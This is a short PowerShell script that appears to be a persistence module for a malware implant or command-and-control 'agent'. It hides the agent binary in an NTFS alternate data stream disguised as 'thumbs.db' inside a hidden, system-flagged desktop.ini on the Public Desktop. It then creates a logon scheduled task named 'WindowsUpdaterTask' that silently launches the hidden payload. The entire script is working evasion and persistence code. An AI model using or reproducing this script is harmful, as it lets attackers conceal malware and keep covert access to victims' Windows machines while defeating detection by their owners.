param($args)

$agentPath = $env:AgentPath
if (-not $agentPath) {
    Write-Output "AgentPath environment variable not set."
    exit
}

# ========== Carrier file on Public Desktop ==========
$carrierFile = "C:\Users\Public\Desktop\desktop.ini"
$streamName = "thumbs.db"

if (-not (Test-Path $carrierFile)) {
    Set-Content -Path $carrierFile -Value "[.ShellClassInfo]" -Encoding ASCII
    attrib +h +s $carrierFile
    Write-Output "Created carrier file: $carrierFile"
}

# ========== Hide agent in ADS ==========
Write-Output "Hiding agent in $carrierFile`:$streamName ..."
$agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
$hiddenPath = "$carrierFile`:$streamName"

# ========== Create scheduled task to run hidden agent at logon ==========
$taskName = "WindowsUpdaterTask"
$execCommand = "powershell.exe -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"

schtasks /delete /tn $taskName /f 2>$null
schtasks /create /tn $taskName /tr "$execCommand" /sc onlogon /ru $env:USERNAME /f /it | Out-Null

if ($LASTEXITCODE -eq 0) {
    Write-Output "Scheduled task '$taskName' created. Agent will run at next logon."
} else {
    Write-Output "Failed to create scheduled task."
}

Write-Output ""
Write-Output "DONE. Agent hidden in: $hiddenPath"